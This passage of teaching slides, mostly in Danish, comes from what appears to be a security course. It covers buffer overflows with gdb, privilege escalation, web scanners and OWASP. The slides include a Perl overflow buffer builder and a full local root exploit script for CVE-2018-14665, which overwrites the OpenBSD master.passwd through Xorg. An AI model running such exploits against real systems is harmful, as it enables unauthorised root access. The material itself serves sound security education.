\item GNU compileren og debuggeren fungerer ok, men check andre!
\item Prøv \verb+gdb ./demo+ og kør derefter programmet fra \emph{gdb prompten}
med  \verb+run 1234+
\item Når I således ved hvor lang strengen skal være kan I fortsætte
  med \verb+nm+ kommandoen -- til at finde adressen på
  \verb+the_shell+\\
Skriv \verb+nm demo | grep shell+

\item Kunsten er således at generere en streng der er præcist så lang
  at man får lagt denne adresse ind på det \emph{rigtige sted}.
\item Perl kan erstatte AAAAA således \verb+`perl -e "print 'A'x10"`+
\end{list1}


\slide{Debugging af C med GDB}

\begin{list1}
\item Vi laver sammen en session med GDB
\item Afprøvning med diverse input
\begin{list2}
\item \verb+./demo langstrengsomgiverproblemerforprogrammethvorformon+
\item \verb+gdb demo+ efterfulgt af run med parametre\\
\verb+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAA+
\end{list2}
\end{list1}

{\bfseries Hjælp:}\\
Kompiler programmet og kald det fra kommandolinien med
\verb+./demo 123456...7689+ indtil det dør ... derefter prøver I det
samme i GDB

Hvad sker der? Avancerede brugere kan ændre
\verb+strcpy+ til \verb+strncpy+


\slide{GDB output}

\begin{alltt}
\small
hlk@bigfoot:demo$ gdb demo
GNU gdb 5.3-20030128 (Apple version gdb-330.1) (Fri Jul 16 21:42:28 GMT 2004)
Copyright 2003 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "powerpc-apple-darwin".
Reading symbols for shared libraries .. done
(gdb) {\bf run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}
Starting program: /Volumes/userdata/projects/security/exploit/demo/demo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Reading symbols for shared libraries . done
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal EXC_BAD_ACCESS, Could not access memory.
{\bf 0x41414140} in ?? ()
(gdb)
\end{alltt}


\slide{Exploits -- udnyttelse af sårbarheder}

\begin{list2}
\item Exploit/exploitprogram er udnytter en sårbarhed rettet mod et specifikt system.
\item Kan være 5 linier eller flere sider ofte Perl, Python eller et C program
\end{list2}

Eksempel demo i Perl, uddrag:
\begin{alltt}\footnotesize
$buffer = "";
$null = "\textbackslash{}x00";
$nop = "\textbackslash{}x90";

$nopsize = 1;
$len = 201; // what is needed to overflow, maybe 201, maybe more!
$the_shell_pointer = 0x01101d48; // address where shellcode is
# Fill buffer
for ($i = 1; $i < $len;$i += $nopsize) \{
    $buffer .= $nop;
\}
$address = pack('l', $the_shell_pointer);
$buffer .= $address;
exec "$program", "$buffer";
\end{alltt}


\slide{Privilegier least privilege}

\begin{list1}
\item Hvorfor afvikle applikationer med administrationsrettigheder -
  hvis der kun skal læses fra eksempelvis en database?
\item {\bfseries Least privilege}
betyder at man afvikler kode med det mest
restriktive sæt af privileger -- kun lige nok til at
opgaven kan udføres
\item Dette praktiseres sjældent i webløsninger i Danmark
\end{list1}

\slide{Privilegier privilege escalation}
\begin{list1}
\item {\bfseries Privilege escalation} er når man på en eller anden vis
opnår højere privileger på et system, eksempelvis som
følge af fejl i programmer der afvikles med højere
privilegier. Derfor HTTPD servere på Unix afvikles som
nobody -- ingen specielle rettigheder.
\item En angriber der kan afvikle vilkårlige kommandoer kan ofte finde
  en sårbarhed som kan udnyttes lokalt -- få rettigheder = lille skade
\end{list1}

Eksempel: man finder exploit som giver kommandolinieadgang til et system
som almindelig bruger

Ved at bruge en local exploit, Linuxkernen kan man måske forårsage fejl
og opnå root, GNU Screen med SUID bit eksempelvis


\slide{Local vs. remote exploits}

\begin{list1}
\item {\bfseries Local vs. remote}
angiver om et exploit er rettet mod
en sårbarhed lokalt på maskinen, eksempelvis
opnå højere privilegier, eller beregnet
til at udnytter sårbarheder over netværk
\item {\bfseries Remote root exploit}
- den type man frygter mest, idet
det er et exploit program der når det afvikles giver
angriberen fuld kontrol, root user er administrator
på Unix, over netværket.
\item {\bfseries Zero-day exploits} dem som ikke offentliggøres -- dem
  som hackere holder for sig selv. Dag 0 henviser til at ingen kender
  til dem før de offentliggøres og ofte er der umiddelbart ingen
  rettelser til de sårbarheder
\end{list1}


\slide{The Exploit Database - dagens buffer overflow}

\hlkimage{13cm}{exploit-db.png}

\centerline{\link{http://www.exploit-db.com/}}



\slide{Hypertext Transfer Protocol -- HTTP}

\hlkimage{13cm}{images/wireshark-http.png}

Se også \link{https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol}

\slide{Primary HTTP mthods}

\begin{list2}
\item [GET]{\small
Requests a representation of the specified resource. Requests using GET should only retrieve data and should have no other effect. (This is also true of some other HTTP methods.)[1] The W3C has published guidance principles on this distinction, saying, "Web application design should be informed by the above principles, but also by the relevant limitations."[13] See safe methods below.}
\item [HEAD]{\small
Asks for the response identical to the one that would correspond to a GET request, but without the response body. This is useful for retrieving meta-information written in response headers, without having to transport the entire content.}
\item [POST]{\small
Requests that the server accept the entity enclosed in the request as a new subordinate of the web resource identified by the URI. The data POSTed might be, for example, an annotation for existing resources; a message for a bulletin board, newsgroup, mailing list, or comment thread; a block of data that is the result of submitting a web form to a data-handling process; or an item to add to a database.[14]}
\item [PUT]{\small
Requests that the enclosed entity be stored under the supplied URI. If the URI refers to an already existing resource, it is modified; if the URI does not point to an existing resource, then the server can create the resource with that URI.[15]}
\end{list2}

Source: \link{https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol}


\slide{Informationsindsamling}

\begin{list1}
\item Indsamling af informationer kan være aktiv eller passiv indsamling i forhold
  til målet for angrebet
\item {\bf passiv} kunne være at lytte med på trafik eller søge i databaser
  på Internet: google, whois, archive.org m.fl.

Eksempel: start Wireshark og browser på samme client

\vskip 1cm
\item {\bf aktiv indsamling} er eksempelvis at sende ICMP pakker og
  registrere hvad man får af svar, portscan m.v.\\

Eksempel: brug SSLScan programmet og udfør mange request mod en server\\
\verb+sslscan --ssl2 server+
\end{list1}

Check dit site med \link{http://www.ssllabs.com}


\slide{Nikto webscanner}

\hlkimage{2cm}{nikto.jpg}

\begin{quote}
{\bf Description}
Nikto is an Open Source (GPL) web server scanner which performs
comprehensive tests against web servers for multiple items, including
over 3200 potentially dangerous files/CGIs, versions on over 625
servers, and version specific problems on over 230 servers. Scan items
and plugins are frequently updated and can be automatically updated
(if desired).
\end{quote}

\begin{list1}
\item Nem at starte, checker en hel del - og kan selvfølgelig udvides
\item \verb+nikto -host 127.0.0.1 -port 8080+
\item Vi afprøver nu følgende programmer sammen:
\item Nikto web server scanner \link{http://cirt.net/nikto2}
\end{list1}


\slide{Demo: Nikto}

\begin{alltt}
\footnotesize
Script started on Tue Nov  7 17:43:54 2006
$  nikto -host 127.0.0.1 -port 8080 ^M
---------------------------------------------------------------------------
- Nikto 1.35/1.34     -     www.cirt.net
+ Target IP:       127.0.0.1
+ Target Hostname: localhost.pentest.dk
+ Target Port:     8080
+ Start Time:      Tue Nov  7 17:43:59 2006
...
+ /examples/ - Directory indexing enabled, also default JSP examples. (GET)
+ /examples/jsp/snp/snoop.jsp - Displays information about page
retrievals, including other users. (GET)
+ /examples/servlets/index.html - Apache Tomcat default JSP pages
present. (GET)
\end{alltt}
%$

\begin{list1}
\item Demo nikto - burde finde nogle ting
\item Falske positiv vs falske negativ!
\item Prøv nikto senere
\end{list1}


\slide{OWASP top ten}

\hlkimage{12cm}{owasp.jpg}

\begin{quote}
The OWASP Top Ten provides a minimum standard for web application
security. The OWASP Top Ten represents a broad consensus about what
the most critical web application security flaws are.
\end{quote}

\begin{list1}
%% already in picture\item The Open Web Application Security Project (OWASP)
\item OWASP -- goto stedet for materiale om  sikkerhedsproblemer for webapplikationer
\item \link{http://www.owasp.org}
\item Også værktøjer som Zed Attack Proxy (ZAP)\\
 \url{https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project}
\end{list1}

\slide{Burp Suite -- min favoritscanner til Web}

\begin{quote}
Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application's attack surface, through to finding and exploiting security vulnerabilities.

Burp gives you full control, letting you combine advanced manual techniques with state-of-the-art automation, to make your work faster, more effective, and more fun.
\end{quote}

Burp suite indeholder både proxy, spider, scanner og andre værktøjer i samme pakke

\link{http://portswigger.net/burp/}\\
\link{https://pro.portswigger.net/bappstore/}



\slide{Forudsætninger}

\begin{list1}
\item Bemærk: alle angreb har forudsætninger for at virke
\item Et angreb mod Telnet virker kun hvis du bruger Telnet
\item Et angreb mod Apache HTTPD virker ikke mod Microsoft IIS
\item Som forsvarer: Kan du bryde kæden af forudsætninger har du vundet!
\item Eksempler på forudsætninger:
\item Computeren skal være tændt, Funktionen der misbruges skal være slået til, Executable stack, Executable heap, Fejl i programmet
\end{list1}

\vskip 2cm

\centerline{\color{titlecolor}\LARGE \bf alle programmer har fejl}



\slide{Gode operativsystemer}

\begin{list1}
\item Nyere versioner af Microsoft Windows, Mac OS X og Linux distributionerne inkluderer:
\begin{list2}
\item Buffer overflow protection
\item Stack protection, non-executable stack
\item Heap protection, non-executable heap
\item \emph{Randomization of parameters} stack gap m.v.
\item ... en masse mere
\end{list2}
\item Vælg derfor hellere:
\begin{list2}
\item Windows 7/8/10, fremfor Windows XP
\item Mac OS X 10.11 fremfor 10.8
\item Linux sikkerhedsopdateringer, sig ja når de kommer
\end{list2}
\item Det samme gælder for serveroperativsystemer
\item NB: Meget få indlejrede systemer har beskyttelse! Internet of Thrash
\end{list1}


\slide{Undgå standard indstillinger}

\begin{list1}
\item Når vi scanner efter services går det nemt med at finde dem
\item Giv jer selv mere tid til at omkonfigurere og opdatere ved at undgå standardindstillinger
\item Tiden der går fra en sårbarhed annonceres på internet til den
  bliver udnyttet er meget kort i dag! Timer!
\item Ved at undgå standard indstillinger kan der
  måske opnås en lidt længere frist -- inden ormene kommer
\item NB: Ingen garanti -- og det hjælper sjældent mod en dedikeret angriber
\item Dårlige passwords og konfigurationsfejl -- ofte overset
\end{list1}


\slide{CVE-2018-14665 Multiple Local Privilege Escalation}

\begin{alltt}\footnotesize
#!/bin/sh
# local privilege escalation in X11 currently
# unpatched in OpenBSD 6.4 stable - exploit
# uses cve-2018-14665 to overwrite files as root.
# Impacts Xorg 1.19.0 - 1.20.2 which ships setuid
# and vulnerable in default OpenBSD.
# - https://hacker.house
echo [+] OpenBSD 6.4-stable local root exploit
cd /etc
Xorg -fp 'root:$2b$08$As7rA9IO2lsfSyb7OkESWueQFzgbDfCXw0JXjjYszKa8Aklt5RTSG:0:0:daemon:0:0:Charlie &:/root:/bin/ksh'
 -logfile master.passwd :1 &
sleep 5
pkill Xorg
echo [-] dont forget to mv and chmod /etc/master.passwd.old back
echo [+] type 'Password1' and hit enter for root
su -
\end{alltt}
Code from: \url{https://weeraman.com/x-org-security-vulnerability-cve-2018-14665-f97f9ebe91b3}

\begin{list2}
\item The X.Org project provides an open source implementation of the X Window System. X.Org security advisory: October 25, 2018
\url{https://lists.x.org/archives/xorg-announce/2018-October/002927.html}

%\item Example exploit method, write cron job - wait for shell:\\
%\url{https://www.exploit-db.com/exploits/45742}
\end{list2}


\slide{Example Linux Kernel Vulnerabilities}

The Linux kernel has had some vulnerabilities over the years:\\
This link is for: Linux » Linux Kernel : Security Vulnerabilities (CVSS score >= 9)\\

{\footnotesize\url{https://www.cvedetails.com/vulnerability-list/vendor_id-33/product_id-47/cvssscoremin-9/cvssscoremax-/Linux-Linux-Kernel.html}}

Linux Kernel 2308 vulnerabilities from 1999 to 2019\\
\url{https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33}

\slide{Linux Kernel Fuzzing}

\begin{list2}
\item CVE-2016-0758 Integer overflow in lib/asn1\_decoder.c in the Linux kernel before 4.6 allows local users to gain privileges via crafted ASN.1 data.\\
\url{https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0758}
\item Linux kernel have about 5 ASN.1 parsers\\
\url{https://www.x41-dsec.de/de/lab/blog/kernel_userspace/}
\end{list2}


\slide{Getting to your data: Google for it}

\hlkimage{10cm}{images/googledorks-1.pdf}

\begin{list2}
\item Google as a hacker tool? oprindeligt beskrevet af Johnny Long
\item Concept named googledorks when google indexes information not supposed to be public
\item \link{http://www.exploit-db.com/google-dorks/}
\end{list2}



\slide{Security devops}

\begin{list1}
\item We need devops skillz in security
\item automate, security is also big data
\item integrate tools, transfer, sort, search, pattern matching, statistics, ...
\item tools, languages, databases, protocols, data formats
\item Use Github!
\item Så mange biblioteker og programmer, noget eksisterende løser måske dit problem 90%
\end{list1}

\vskip 1cm
\centerline{\Large We are all Devops now, even security people!}


\myquestionspage



\slide{Exploit components}

\begin{list1}
\item Shellcoders Handbook  and Grayhat chapters 12-14
\item Difference between the oldest, most simple stack based overflows
\item The parts of a shell code running system calls
\item How to avoid having shell code - return into libc, calling functions
\item This will teach us why modern operating systems have multiple methods designed to remove each case of exploiting
\item Allow us to understand the next subject, Return-Oriented Programming (ROP)
\end{list1}

Recommended shell code video:\\
EXPLORING NEW DEPTHS OF THREAT HUNTING ...OR HOW TO WRITE ARM SHELLCODE IN SIX MINUTES\\
Speaker: Maria Markstedter, Azeria Labs\\
\link{https://www.youtube.com/watch?v=DGJZBDlhIGU}


\slide{Return-Oriented Programming (ROP)}

\begin{list1}
\item Advanced subject Return-Oriented Programming (ROP)
\item \emph{Return-Oriented Programming:Systems, Languages, and Applications}
Ryan Roemer, Erik Buchanan, Hovav Shacam and Stefan Savage University of California, San Diego\\
\link{https://hovav.net/ucsd/dist/rop.pdf}
\item Then look into how a security oriented operating system has decided to prevent this method:
\item \emph{Removing ROP Gadgets from OpenBSD}
Todd Mortimer\\
\link{https://www.openbsd.org/papers/asiabsdcon2019-rop-paper.pdf}
\end{list1}

\slide{Setup the OWASP Juice Shop}

\begin{list1}
\item Recommmended for all developers: Try running the OWASP Juice Shop
\item This is an application which is modern AND designed to have security flaws.
\item Read more about this project at:\\
\link{https://www2.owasp.org/www-project-juice-shop/} and\\ \link{https://github.com/bkimminich/juice-shop}
\item It is recommended to buy the Pwning OWASP Juice Shop Official companion guide to the OWASP Juice Shop from https://leanpub.com/juice-shop - suggested price USD 5.99. Alternatively read online at https://pwning.owasp-juice.shop/
\item Sometimes the best method is running the Docker version
\end{list1}


\slide{Lab setup and Nmap Workshop}

\begin{list2}
\item Let says you want to do this, then go and do two things, after:
\item Prepare/finish your lab setup\\
\url{https://github.com/kramse/kramse-labs}

\item Switch to the materials found in my Nmap Workshop and perform Nmap scans\\
\url{https://github.com/kramse/security-courses/tree/master/courses/pentest/nmap-workshop}
\end{list2}


\end{document}
